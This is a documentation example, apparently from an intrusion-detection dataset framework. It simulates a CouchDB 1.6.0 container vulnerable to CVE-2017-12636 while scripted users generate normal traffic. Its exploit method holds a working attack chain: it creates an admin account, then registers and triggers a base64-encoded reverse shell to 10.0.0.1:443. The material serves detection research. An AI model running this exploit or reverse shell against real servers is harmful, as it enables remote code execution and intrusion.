Cookbook/Examples
*****************


This example code simulate a CouchDB Version 1.6.0 instance which is vulnerable to CVE-2017-12636.

More information on this environment can be found here: Vulhub_

.. _Vulhub: https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636

.. code-block:: python

   import requests
   import sys
   import json
   import base64
   import random

   from cloudant.client import Cloudant
   from requests.auth import HTTPBasicAuth
   from lid_ds.core import Scenario
   from lid_ds.sim import Behaviour

   warmt = 15
   rect = 120

   min_user_count = 10
   max_user_count = 25
   user_count = random.randint(min_user_count, max_user_count)

   total_duration = warmt+rect
   warmup_time = warmt
   exploit_time = random.randint(int(rect * .3), int(rect * .8))

   class CVE_2017_12636(Scenario):
       def exploit(self, container):
           target = 'http://localhost:5984'
           command = rb"""sh -i >& /dev/tcp/10.0.0.1/443 0>&1"""
           version = 1

           session = requests.session()
           session.headers = {
               'Content-Type': 'application/json'
           }
           # session.proxies = {
           #     'http': 'http://127.0.0.1:8085'
           # }
           session.put(target + '/_users/org.couchdb.user:wooyun', data='''{
               "type": "user",
               "name": "wooyun",
               "roles": ["_admin"],
               "roles": [],
               "password": "wooyun"
           }''')

           session.auth = HTTPBasicAuth('wooyun', 'wooyun')

           command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command).decode()
           if version == 1:
               session.put(target + ('/_config/query_servers/cmd'), data=json.dumps(command))
           else:
               host = session.get(target + '/_membership').json()['all_nodes'][0]
               session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

           session.put(target + '/wooyun')
           session.put(target + '/wooyun/test', data='{"_id": "wooyuntest"}')

           if version == 1:
               session.post(target + '/wooyun/_temp_view?limit=10', data='{"language":"cmd","map":""}')
           else:
               session.put(target + '/wooyun/_design/test', data='{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}')
       def wait_for_availability(self, container):
           try:
               requests.get('http://localhost:5984')
           except Exception:
               return False
           print('CouchDB Container is up')
           return True

   class CouchDBUser(Behaviour):
       def __init__(self, host, port, uname, passwd, total_duration):
           super().__init__([], total_duration)
           self.host = host
           self.port = port
           self.uname = uname
           self.passwd = passwd
           self.actions.append(self._init_normal)
           for wait_time in self.wait_times[1:]:
               self.actions.append(self.do_normal)

       def _init_normal(self):
           try:
               self.client = Cloudant(self.uname, self.passwd, url='{}:{}'.format(self.host, self.port))
               self.session = self.client.session()
           except:
               pass

       def do_normal(self):
           try:
               self.client.create_database('hellodb')
           except Exception as Error:
               pass

   behaviours = []
   for i in range(user_count):
       duration = random.random() * total_duration
       behaviours.append(CouchDBUser("http://localhost", "5984", "wooyun", "wooyun", total_duration * (i/user_count)))

   scenario = CVE_2017_12636(
           'vulhub/couchdb:1.6.0',
           port_mapping={
               '5984/tcp':5984
           },
           warmup_time=warmup_time,
           recording_time=(total_duration-warmup_time),
           behaviours=behaviours,
           exploit_start_time=exploit_time # Comment this line if you don't want the exploit to be executed
       )
   scenario()
